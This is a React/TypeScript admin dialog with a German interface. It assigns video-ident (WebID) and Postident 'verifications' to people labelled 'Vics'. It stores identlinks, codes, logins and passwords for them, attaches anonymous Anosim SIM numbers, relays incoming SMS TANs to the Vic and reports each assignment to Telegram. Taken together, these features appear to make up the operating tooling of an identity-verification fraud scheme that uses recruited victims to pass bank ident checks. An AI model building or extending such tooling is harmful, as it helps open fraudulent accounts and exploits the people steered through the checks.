import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandInput,
  CommandItem,
  CommandList,
} from "@/components/ui/command";
import { Search, Plus, ChevronsUpDown, Check, UserPlus, FileText, Phone, ShieldAlert, Loader2, MessageSquare } from "lucide-react";
import { DialogShellHeader, DialogSection, DialogFooterBar } from "@/components/admin/DialogShell";
import { Separator } from "@/components/ui/separator";
import VerificationLogo from "@/components/VerificationLogo";
import { cn } from "@/lib/utils";
import { notifyTelegram } from "@/lib/telegramNotify";

interface VicUser {
  id: string;
  email: string | null;
  first_name: string | null;
  last_name: string | null;
}

interface PhoneNumber {
  id: string;
  token: string;
  api_url: string;
}

const FIELD_LABELS: Record<string, string> = {
  identcode: "Identcode",
  identlink: "Identlink",
  email: "Email",
  username: "Anmeldename",
  password: "Passwort",
  phone: "Telefonnummer",
};

interface Props {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  verification: {
    id: string;
    title: string;
    required_fields: string[];
    type?: string;
    logo_url?: string | null;
  } | null;
  onAssigned?: () => void;
}

export default function AssignVerificationDialog({ open, onOpenChange, verification, onAssigned }: Props) {

  const { user } = useAuth();
  const { toast } = useToast();

  const [vics, setVics] = useState<VicUser[]>([]);
  const [loadingVics, setLoadingVics] = useState(false);
  const [search, setSearch] = useState("");
  const [selectedVic, setSelectedVic] = useState<VicUser | null>(null);
  const [assignedUserIds, setAssignedUserIds] = useState<Set<string>>(new Set());

  const [fieldValues, setFieldValues] = useState<Record<string, string>>({});
  const [phoneNumbers, setPhoneNumbers] = useState<PhoneNumber[]>([]);
  const [phoneDataMap, setPhoneDataMap] = useState<Record<string, string>>({});
  const [loadingPhones, setLoadingPhones] = useState(false);
  const [selectedPhoneId, setSelectedPhoneId] = useState<string>("");
  const [phonePopoverOpen, setPhonePopoverOpen] = useState(false);
  const [showNewPhone, setShowNewPhone] = useState(false);
  const [newPhoneLink, setNewPhoneLink] = useState("");
  const [addingPhone, setAddingPhone] = useState(false);
  const [pdfFile, setPdfFile] = useState<File | null>(null);
  const [forwardTanToVic, setForwardTanToVic] = useState(false);
  const [webidRedirect, setWebidRedirect] = useState(false);
  const [saving, setSaving] = useState(false);

  const isPostident = verification?.type === "postident";

  useEffect(() => {
    if (open) {
      setSelectedVic(null);
      setFieldValues({});
      setSelectedPhoneId("");
      setShowNewPhone(false);
      setNewPhoneLink("");
      setPdfFile(null);
      setForwardTanToVic(false);
      setWebidRedirect(false);
      setSearch("");
      fetchVics();
    }
  }, [open]);

  useEffect(() => {
    if (selectedVic && verification?.required_fields.includes("phone")) {
      fetchPhoneNumbers();
    }
  }, [selectedVic]);

  const fetchVics = async () => {
    setLoadingVics(true);
    const [rolesRes, assignmentsRes] = await Promise.all([
      supabase.from("user_roles").select("user_id").eq("role", "user"),
      verification
        ? supabase.from("verification_assignments").select("user_id").eq("verification_id", verification.id)
        : Promise.resolve({ data: [] }),
    ]);

    const assignedIds = new Set((assignmentsRes.data || []).map((a: any) => a.user_id));
    setAssignedUserIds(assignedIds);

    const roles = rolesRes.data;
    if (roles && roles.length > 0) {
      const ids = roles.map((r) => r.user_id);
      const { data: profiles } = await supabase
        .from("profiles")
        .select("id, email, first_name, last_name")
        .in("id", ids);
      setVics((profiles as VicUser[]) || []);
    } else {
      setVics([]);
    }
    setLoadingVics(false);
  };

  const resolvePhoneNumber = async (token: string): Promise<string | null> => {
    try {
      const { data: proxyData } = await supabase.functions.invoke("anosim-proxy", {
        body: { token },
      });
      return proxyData?.number ?? null;
    } catch {
      return null;
    }
  };

  const fetchPhoneNumbers = async () => {
    setLoadingPhones(true);
    const { data } = await supabase
      .from("phone_numbers")
      .select("id, token, api_url");
    const phones = (data as PhoneNumber[]) || [];
    setPhoneNumbers(phones);

    const map: Record<string, string> = {};
    await Promise.all(
      phones.map(async (p) => {
        const num = await resolvePhoneNumber(p.token);
        if (num) map[p.id] = num;
      })
    );
    setPhoneDataMap(map);
    setLoadingPhones(false);
  };

  const filteredVics = vics.filter((v) => {
    const q = search.toLowerCase();
    return (
      (v.email?.toLowerCase().includes(q) ?? false) ||
      (v.first_name?.toLowerCase().includes(q) ?? false) ||
      (v.last_name?.toLowerCase().includes(q) ?? false)
    );
  });

  const availableVics = filteredVics.filter((v) => !assignedUserIds.has(v.id));
  const assignedVics = filteredVics.filter((v) => assignedUserIds.has(v.id));

  const extractToken = (url: string): string | null => {
    try {
      const u = new URL(url);
      return u.searchParams.get("token");
    } catch {
      return null;
    }
  };

  const handleAddPhone = async () => {
    const link = newPhoneLink.trim();
    if (!link) return;
    const token = extractToken(link);
    if (!token) {
      toast({ title: "Ungültiger Anosim-Link", variant: "destructive" });
      return;
    }
    setAddingPhone(true);
    const { data: inserted, error } = await supabase
      .from("phone_numbers")
      .insert({ token, api_url: link, created_by: user?.id })
      .select("id, token, api_url")
      .single();
    if (error || !inserted) {
      toast({
        title: "Fehler beim Speichern der Telefonnummer",
        description: error?.message,
        variant: "destructive",
      });
      setAddingPhone(false);
      return;
    }
    const num = await resolvePhoneNumber(inserted.token);
    setPhoneNumbers((prev) => [...prev, inserted as PhoneNumber]);
    if (num) setPhoneDataMap((prev) => ({ ...prev, [inserted.id]: num }));
    setSelectedPhoneId(inserted.id);
    setShowNewPhone(false);
    setNewPhoneLink("");
    setAddingPhone(false);
    toast({ title: "Telefonnummer gespeichert" });
  };

  const handleSave = async () => {
    if (!verification || !selectedVic) return;

    if (isPostident && !pdfFile) {
      toast({ title: "Bitte eine PDF-Datei auswählen", variant: "destructive" });
      return;
    }
    if (isPostident && pdfFile && pdfFile.type !== "application/pdf") {
      toast({ title: "Nur PDF-Dateien erlaubt", variant: "destructive" });
      return;
    }

    setSaving(true);

    let phoneNumberId: string | null =
      !isPostident && verification.required_fields.includes("phone") && selectedPhoneId
        ? selectedPhoneId
        : null;

    // Auto-save pending new Anosim link
    if (
      !isPostident &&
      verification.required_fields.includes("phone") &&
      showNewPhone &&
      newPhoneLink.trim()
    ) {
      const link = newPhoneLink.trim();
      const token = extractToken(link);
      if (!token) {
        toast({ title: "Ungültiger Anosim-Link", variant: "destructive" });
        setSaving(false);
        return;
      }
      const { data: inserted, error: insErr } = await supabase
        .from("phone_numbers")
        .insert({ token, api_url: link, created_by: user?.id })
        .select("id, token, api_url")
        .single();
      if (insErr || !inserted) {
        toast({
          title: "Fehler beim Speichern der Telefonnummer",
          description: insErr?.message,
          variant: "destructive",
        });
        setSaving(false);
        return;
      }
      const num = await resolvePhoneNumber(inserted.token);
      setPhoneNumbers((prev) => [...prev, inserted as PhoneNumber]);
      if (num) setPhoneDataMap((prev) => ({ ...prev, [inserted.id]: num }));
      phoneNumberId = inserted.id;
      setSelectedPhoneId(inserted.id);
      setShowNewPhone(false);
      setNewPhoneLink("");
    }

    const { data: assignment, error } = await supabase
      .from("verification_assignments")
      .insert({
        verification_id: verification.id,
        user_id: selectedVic.id,
        field_values: isPostident ? {} : fieldValues,
        phone_number_id: phoneNumberId,
        created_by: user?.id,
        forward_tan_to_vic: !isPostident && verification.required_fields.includes("phone") ? forwardTanToVic : false,
        webid_redirect: !isPostident && verification.required_fields.includes("identlink") ? webidRedirect : false,
      })
      .select("id")
      .single();

    if (error || !assignment) {
      toast({ title: "Fehler beim Zuweisen", description: error?.message, variant: "destructive" });
      setSaving(false);
      return;
    }

    if (isPostident && pdfFile) {
      const safeName = pdfFile.name.replace(/[^a-zA-Z0-9._-]/g, "_");
      const path = `${selectedVic.id}/${assignment.id}/${crypto.randomUUID()}-${safeName}`;
      const { error: upErr } = await supabase.storage
        .from("user-documents")
        .upload(path, pdfFile, { contentType: "application/pdf" });
      if (upErr) {
        toast({ title: "Fehler beim PDF-Upload", description: upErr.message, variant: "destructive" });
        setSaving(false);
        return;
      }
      const { error: docErr } = await supabase.from("user_documents").insert({
        user_id: selectedVic.id,
        assignment_id: assignment.id,
        file_name: pdfFile.name,
        file_path: path,
        file_type: "application/pdf",
        file_size: pdfFile.size,
      });
      if (docErr) {
        toast({
          title: "Fehler beim Speichern der Dokument-Info",
          description: docErr.message,
          variant: "destructive",
        });
        setSaving(false);
        return;
      }
    }

    toast({ title: "Verifikation zugewiesen" });
    notifyTelegram("assignment_created", {
      vic_name: `${selectedVic.first_name ?? ""} ${selectedVic.last_name ?? ""}`.trim() || (selectedVic.email ?? "Unbekannt"),
      vic_email: selectedVic.email,
      verification_title: verification.title,
      verification_type: isPostident ? "Postident" : "Videocall",
    });
    onAssigned?.();
    onOpenChange(false);

    setSaving(false);
  };

  if (!verification) return null;

  // Step 1: Vic selection
  if (!selectedVic) {
    return (
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="sm:max-w-lg p-6 gap-0">
          <DialogHeader className="space-y-0">
            <DialogShellHeader
              icon={<UserPlus className="w-5 h-5" />}
              eyebrow="Zuweisen"
              title={<DialogTitle asChild><span>Vic auswählen</span></DialogTitle>}
              description={<span>Auftrag: <span className="font-medium text-foreground">{verification.title}</span></span>}
              right={
                <div className="w-10 h-10 rounded-md border border-border bg-card overflow-hidden shrink-0">
                  <VerificationLogo
                    value={verification.logo_url ?? null}
                    alt={verification.title}
                    className="w-full h-full object-contain"
                  />
                </div>
              }
            />
          </DialogHeader>

          <div className="pt-5 pb-4 space-y-3">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                placeholder="Nach Name oder E-Mail suchen…"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="pl-9 h-10"
              />
            </div>
            <ScrollArea className="h-[340px] rounded-md border border-border bg-muted/30">
              {loadingVics ? (
                <div className="flex items-center justify-center gap-2 py-12 text-sm text-muted-foreground">
                  <Loader2 className="w-4 h-4 animate-spin" /> Lädt Vics…
                </div>
              ) : availableVics.length === 0 && assignedVics.length === 0 ? (
                <p className="text-sm text-muted-foreground text-center py-12">Keine Vics gefunden</p>
              ) : (
                <div className="p-2 space-y-1">
                  {availableVics.map((v) => {
                    const initials = `${v.first_name?.[0] ?? ""}${v.last_name?.[0] ?? ""}`.toUpperCase() || "?";
                    return (
                      <button
                        key={v.id}
                        className="group flex w-full items-center gap-3 rounded-md border border-transparent px-3 py-2.5 text-left transition-colors hover:border-border hover:bg-card"
                        onClick={() => setSelectedVic(v)}
                      >
                        <div className="flex h-9 w-9 items-center justify-center rounded-md bg-primary/10 text-xs font-bold text-primary">
                          {initials}
                        </div>
                        <div className="min-w-0 flex-1">
                          <p className="text-sm font-medium text-foreground truncate">
                            {v.first_name || ""} {v.last_name || ""}
                          </p>
                          {v.email && <p className="text-xs text-muted-foreground truncate">{v.email}</p>}
                        </div>
                        <ChevronsUpDown className="w-4 h-4 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
                      </button>
                    );
                  })}
                  {assignedVics.length > 0 && (
                    <>
                      <Separator className="my-2" />
                      <p className="text-[11px] uppercase tracking-wider text-muted-foreground px-3 py-1 font-semibold">Bereits zugewiesen</p>
                      {assignedVics.map((v) => (
                        <div
                          key={v.id}
                          className="flex w-full cursor-not-allowed items-center gap-3 rounded-md px-3 py-2.5 text-left text-sm opacity-50"
                        >
                          <div className="flex h-9 w-9 items-center justify-center rounded-md bg-muted text-xs font-semibold text-muted-foreground">
                            {(v.first_name?.[0] ?? "?").toUpperCase()}
                          </div>
                          <div className="min-w-0 flex-1">
                            <p className="text-sm font-medium truncate">{v.first_name || ""} {v.last_name || ""}</p>
                            {v.email && <p className="text-xs text-muted-foreground truncate">{v.email}</p>}
                          </div>
                        </div>
                      ))}
                    </>
                  )}
                </div>
              )}
            </ScrollArea>
          </div>

          <DialogFooterBar>
            <Button variant="outline" onClick={() => onOpenChange(false)}>Abbrechen</Button>
          </DialogFooterBar>
        </DialogContent>
      </Dialog>
    );
  }

  // Step 2: Data entry — dedupe required_fields defensively
  const uniqueRequired = Array.from(new Set(verification.required_fields));
  // Ensure identlink is rendered before identcode
  const nonPhoneFields = uniqueRequired.filter((f) => f !== "phone");
  const orderedNonPhone = (() => {
    const rest = nonPhoneFields.filter((f) => f !== "identlink" && f !== "identcode");
    const ordered: string[] = [];
    if (nonPhoneFields.includes("identlink")) ordered.push("identlink");
    if (nonPhoneFields.includes("identcode")) ordered.push("identcode");
    return [...ordered, ...rest];
  })();
  const extractIdentcode = (link: string): string | null => {
    const matches = link.match(/\d{9}/g);
    return matches ? matches[matches.length - 1] : null;
  };
  const selectedPhoneLabel = selectedPhoneId
    ? phoneDataMap[selectedPhoneId] ||
      phoneNumbers.find((p) => p.id === selectedPhoneId)?.token ||
      ""
    : "";

  const vicInitials = `${selectedVic.first_name?.[0] ?? ""}${selectedVic.last_name?.[0] ?? ""}`.toUpperCase() || "?";
  const typeLabel = isPostident ? "Postident" : "Videocall";

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-xl max-h-[90vh] overflow-y-auto p-6 gap-0">
        <DialogHeader className="space-y-0">
          <DialogShellHeader
            icon={
              <div className="w-full h-full rounded-md overflow-hidden bg-card flex items-center justify-center">
                <VerificationLogo
                  value={verification.logo_url ?? null}
                  alt={verification.title}
                  className="w-full h-full object-contain"
                />
              </div>
            }
            eyebrow="Zuweisung – Ident-Daten"
            title={<DialogTitle asChild><span>{verification.title}</span></DialogTitle>}
            description={
              <span className="inline-flex items-center gap-2">
                <span className={`inline-flex items-center gap-1 rounded-md border px-2 py-0.5 text-[10px] font-bold uppercase ${isPostident ? "border-warning/25 bg-warning/10 text-warning" : "border-primary/20 bg-primary/10 text-primary"}`}>
                  {typeLabel}
                </span>
                <span>
                  Für <span className="font-medium text-foreground">{selectedVic.first_name} {selectedVic.last_name}</span>
                </span>
              </span>
            }
          />
        </DialogHeader>

        <div className="space-y-6 py-6">
          <DialogSection label="Vic">
            <div className="flex items-center gap-3 rounded-md border border-border bg-muted/40 px-3 py-2.5">
              <div className="flex h-9 w-9 items-center justify-center rounded-md bg-primary/10 text-xs font-bold text-primary">
                {vicInitials}
              </div>
              <div className="min-w-0 flex-1">
                <p className="text-sm font-medium text-foreground truncate">
                  {selectedVic.first_name} {selectedVic.last_name}
                </p>
                {selectedVic.email && <p className="text-xs text-muted-foreground truncate">{selectedVic.email}</p>}
              </div>
              <Button variant="ghost" size="sm" onClick={() => setSelectedVic(null)} disabled={saving}>
                Ändern
              </Button>
            </div>
          </DialogSection>

          {isPostident && (
            <DialogSection label="Postident-Dokument">
              <div className="rounded-md border border-dashed border-border bg-muted/30 p-5">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-md bg-primary/10 text-primary flex items-center justify-center">
                    <FileText className="w-5 h-5" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium">PDF-Datei hochladen</p>
                    <p className="text-xs text-muted-foreground">Nur PDF, max. eine Datei.</p>
                  </div>
                </div>
                <Input
                  className="mt-3"
                  type="file"
                  accept="application/pdf"
                  onChange={(e) => setPdfFile(e.target.files?.[0] ?? null)}
                />
                {pdfFile && (
                  <div className="mt-2 flex items-center gap-2 text-xs">
                    <FileText className="w-3.5 h-3.5 text-primary" />
                    <span className="font-medium text-foreground truncate">{pdfFile.name}</span>
                    <span className="text-muted-foreground">· {(pdfFile.size / 1024).toFixed(1)} KB</span>
                  </div>
                )}
              </div>
            </DialogSection>
          )}

          {!isPostident && orderedNonPhone.length > 0 && (
            <DialogSection label="Ident-Daten">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                {orderedNonPhone.map((field) => {
                  const isLink = field === "identlink";
                  const isCode = field === "identcode";
                  const parsedHint = isLink && fieldValues.identcode ? `Identcode erkannt: ${fieldValues.identcode}` : null;
                  return (
                    <div key={field} className={isLink ? "sm:col-span-2 space-y-1.5" : "space-y-1.5"}>
                      <Label className="text-sm font-medium">{FIELD_LABELS[field] || field}</Label>
                      <Input
                        placeholder={isLink ? "https://webid-gateway.de/..." : FIELD_LABELS[field] || field}
                        value={fieldValues[field] || ""}
                        readOnly={isCode && !!fieldValues.identlink}
                        className={isCode && !!fieldValues.identlink ? "font-mono bg-muted/50" : ""}
                        onChange={(e) => {
                          const val = e.target.value;
                          setFieldValues((prev) => {
                            const next = { ...prev, [field]: val };
                            if (field === "identlink" && uniqueRequired.includes("identcode")) {
                              const code = extractIdentcode(val);
                              if (code) next.identcode = code;
                            }
                            return next;
                          });
                        }}
                      />
                      {parsedHint && (
                        <p className="text-[11px] text-primary font-medium flex items-center gap-1">
                          <Check className="w-3 h-3" /> {parsedHint}
                        </p>
                      )}
                    </div>
                  );
                })}
              </div>
            </DialogSection>
          )}

          {!isPostident && uniqueRequired.includes("identlink") && (
            <label
              className={cn(
                "flex items-start gap-3 rounded-md border p-3 cursor-pointer transition-colors select-none",
                webidRedirect
                  ? "border-primary/40 bg-primary/5"
                  : "border-border/60 bg-muted/20 hover:border-border"
              )}
            >
              <input
                type="checkbox"
                className="h-4 w-4 mt-0.5 rounded border-border accent-primary shrink-0"
                checked={webidRedirect}
                onChange={(e) => setWebidRedirect(e.target.checked)}
              />
              <div className="flex-1 min-w-0">
                <p className="text-sm font-medium">WebID Redirect aktivieren</p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Der Vic sieht keine App-Download-Links; die Anleitung verweist stattdessen auf den Identlink im Browser.
                </p>
              </div>
            </label>
          )}

          {!isPostident && uniqueRequired.includes("phone") && (
            <DialogSection label="Telefonnummer">
              {!showNewPhone ? (
                <div className="space-y-2">
                  <Popover open={phonePopoverOpen} onOpenChange={setPhonePopoverOpen}>
                    <PopoverTrigger asChild>
                      <Button
                        type="button"
                        variant="outline"
                        role="combobox"
                        className="w-full justify-between font-normal h-10"
                      >
                        <span className="flex items-center gap-2">
                          <Phone className="w-4 h-4 text-muted-foreground" />
                          <span className={cn(!selectedPhoneLabel && "text-muted-foreground")}>
                            {selectedPhoneLabel || "Nummer auswählen"}
                          </span>
                        </span>
                        <ChevronsUpDown className="ml-2 h-4 w-4 shrink-0 opacity-50" />
                      </Button>
                    </PopoverTrigger>
                    <PopoverContent className="p-0 w-[--radix-popover-trigger-width]" align="start">
                      <Command>
                        <CommandInput placeholder="Nummer suchen…" />
                        <CommandList>
                          <CommandEmpty>
                            {loadingPhones ? "Lädt…" : "Keine Nummer gefunden"}
                          </CommandEmpty>
                          <CommandGroup>
                            {phoneNumbers.map((p) => {
                              const label = phoneDataMap[p.id] || p.token;
                              return (
                                <CommandItem
                                  key={p.id}
                                  value={`${label} ${p.token}`}
                                  onSelect={() => {
                                    setSelectedPhoneId(p.id);
                                    setPhonePopoverOpen(false);
                                  }}
                                >
                                  <Check
                                    className={cn(
                                      "mr-2 h-4 w-4",
                                      selectedPhoneId === p.id ? "opacity-100" : "opacity-0"
                                    )}
                                  />
                                  {label}
                                </CommandItem>
                              );
                            })}
                          </CommandGroup>
                        </CommandList>
                      </Command>
                    </PopoverContent>
                  </Popover>
                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={() => setShowNewPhone(true)}
                    className="text-primary hover:text-primary gap-1.5"
                  >
                    <Plus className="w-3.5 h-3.5" /> Neuen Anosim-Link hinzufügen
                  </Button>
                </div>
              ) : (
                <div className="space-y-2 rounded-md border border-primary/30 bg-primary/5 p-3">
                  <Label className="text-xs font-medium text-primary uppercase tracking-wider">Neuer Anosim-Link</Label>
                  <Input
                    placeholder="https://anosim.net/share?token=..."
                    value={newPhoneLink}
                    onChange={(e) => setNewPhoneLink(e.target.value)}
                  />
                  <p className="text-[11px] text-muted-foreground">
                    Wird beim Zuweisen automatisch gespeichert.
                  </p>
                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={() => {
                      setShowNewPhone(false);
                      setNewPhoneLink("");
                    }}
                    disabled={addingPhone}
                  >
                    Abbrechen
                  </Button>
                </div>
              )}
            </DialogSection>
          )}

          {!isPostident && uniqueRequired.includes("phone") && (
            <label
              className={cn(
                "flex items-start gap-3 rounded-md border p-3 cursor-pointer transition-colors select-none",
                forwardTanToVic
                  ? "border-primary/40 bg-primary/5"
                  : "border-border/60 bg-muted/20 hover:border-border"
              )}
            >
              <input
                type="checkbox"
                className="h-4 w-4 mt-0.5 rounded border-border accent-primary shrink-0"
                checked={forwardTanToVic}
                onChange={(e) => setForwardTanToVic(e.target.checked)}
              />
              <div className="flex-1 min-w-0">
                <p className="text-sm font-medium flex items-center gap-1.5">
                  <MessageSquare className="w-4 h-4 text-primary" /> TAN an Vic-Nummer weiterleiten
                </p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Eingehende SMS werden automatisch als „&lt;code&gt; – Ihr Code für die Verifizierung" per seven.io weitergesendet.
                </p>
              </div>
            </label>
          )}
        </div>

        <DialogFooterBar>
          <Button variant="outline" onClick={() => setSelectedVic(null)} disabled={saving}>
            Zurück
          </Button>
          <Button onClick={handleSave} disabled={saving} className="gap-2 min-w-[120px]">
            {saving ? <><Loader2 className="w-4 h-4 animate-spin" /> Weist zu…</> : <><ShieldAlert className="w-4 h-4" /> Zuweisen</>}
          </Button>
        </DialogFooterBar>
      </DialogContent>
    </Dialog>
  );
}
